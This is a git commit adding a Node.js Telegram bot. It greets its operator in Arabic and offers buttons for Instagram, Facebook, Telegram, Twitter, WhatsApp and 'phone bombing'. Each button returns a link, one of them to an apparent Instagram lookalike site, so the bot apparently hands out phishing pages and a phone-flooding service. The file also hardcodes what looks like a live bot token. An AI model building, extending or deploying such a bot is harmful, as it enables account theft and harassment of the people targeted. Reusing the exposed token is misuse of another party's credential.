ce5704a16c3d707f610743d8ff541857c3e5cdf6
4kspaidar4k-maker <4kspaidar4k@gmail.com>
2026-08-06 03:18:50 +0300

    Add files via upload

---
+++ index.js
@@ -0,0 +1,64 @@
+const TelegramBot = require("node-telegram-bot-api");
+
+const TOKEN = "8926452536:AAGMA0SDtBfYCbAVg_4EZCwkj1sw5-p-OfQ";
+
+const bot = new TelegramBot(TOKEN, {
+  polling: true,
+});
+
+console.log("✅ Bot is running...");
+bot.onText(/\/start/, (msg) => {
+    bot.sendMessage(
+        msg.chat.id,
+        "👋 أهلاً بك سيد عمر\n\nاختر المنصة:",
+        {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "📸 Instagram", callback_data: "instagram" },
+                        { text: "📘 Facebook", callback_data: "facebook" }
+                    ],
+                    [
+                        { text: "✈️ Telegram", callback_data: "telegram" },
+                        { text: "🐦 Twitter", callback_data: "twitter" }
+                    ],
+                    [
+                        { text: "💬 تفجير هواتف", callback_data: "تفجير هواتف" },
+                        { text: "💬 WhatsApp", callback_data: "whatsapp" }
+                    ]
+                ]
+            }
+        }
+    );
+});
+bot.on("callback_query", (query) => {
+    const chatId = query.message.chat.id;
+
+    switch (query.data) {
+
+        case "instagram":
+            bot.sendMessage(chatId, "📸 Instagram\nhttps://instagram-two-henna.vercel.app/");
+            break;
+
+        case "facebook":
+            bot.sendMessage(chatId, "📘 Facebook\nhttps://your-domain.com/facebook");
+            break;
+
+        case "telegram":
+            bot.sendMessage(chatId, "✈️ Telegram\nhttps://your-domain.com/telegram");
+            break;
+
+        case "twitter":
+            bot.sendMessage(chatId, "🐦 Twitter\nhttps://your-domain.com/twitter");
+            break;
+
+        case "whatsapp":
+            bot.sendMessage(chatId, "💬 WhatsApp\nhttps://your-domain.com/whatsapp");
+            break;
+             case "تفجير هواتف":
+            bot.sendMessage(chatId, " تفجير هواتف\nhttps://kexart.com/");
+            break;
+    }
+
+    bot.answerCallbackQuery(query.id);
+});
